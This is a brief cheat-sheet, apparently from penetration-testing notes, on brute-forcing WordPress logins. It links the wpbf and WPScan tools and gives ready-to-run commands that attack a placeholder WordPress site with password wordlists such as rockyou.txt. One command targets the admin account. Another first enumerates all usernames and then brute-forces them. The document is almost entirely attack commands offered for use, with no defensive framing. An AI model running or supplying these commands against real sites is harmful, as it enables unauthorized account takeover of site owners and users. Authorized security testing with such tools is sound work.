# Bruteforcing WordPress
Bruteforce tools: 
https://github.com/search?o=desc&q=wordpress+bruteforce&s=&type=Repositories

## wpbf
https://github.com/atarantini/wpbf
```bash
python wpbf.py -w passwords.txt -u admin http://<target-wordpress>
```

## WPScan
https://github.com/wpscanteam/wpscan
```bash
wpscan --url http://<target-wp> --wordlist /usr/share/wordlist/rockyou.txt --username admin
## You can leave out --username. Then it will first enumerate all usernames and then begin bruteforce
wpscan --url http://<target-wp> --wordlist /usr/share/wordlist/rockyou.txt
```